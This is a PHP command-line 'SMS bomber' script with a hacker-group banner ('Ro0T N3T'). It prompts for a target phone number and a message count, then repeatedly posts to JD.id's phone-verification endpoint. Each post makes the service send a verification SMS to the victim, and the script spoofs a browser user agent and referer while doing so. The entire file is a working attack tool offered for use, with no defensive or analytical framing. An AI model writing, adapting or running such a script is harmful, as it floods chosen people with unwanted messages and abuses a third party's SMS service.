<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
######################################################################################
\e[91m 
          Indonesia fig\e[97mhter cyber 
\e[32m
 ____        ___ _____   _   _ __________
|  _ \ ___  / _ \_   _| | \ | |___ /_   _|
| |_) / _ \| | | || |   |  \| | |_ \ | |
|  _ < (_) | |_| || |   | |\  |___) || |
|_| \_\___/ \___/ |_|   |_| \_|____/ |_|

      \e[91m   Red {C} Coded By - Ro0T N3T                                                            \e[32m
######################################################################################\n Ro0T N3T :\e[1;31m";
echo "\e[0;36m Masukan nomor target\n Ro0T N3T : ";
$nomor = trim(fgets(STDIN));
echo "\e[1;31m Ro0T N3T : Jumlah pesan? \n\e[0;36m Ro0T N3T : ";
$jumlah = trim(fgets(STDIN));
echo "\e[1;31m Ro0T N3T : Tuliskan angka --> 0 \n\e[0;36m Ro0T N3T : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>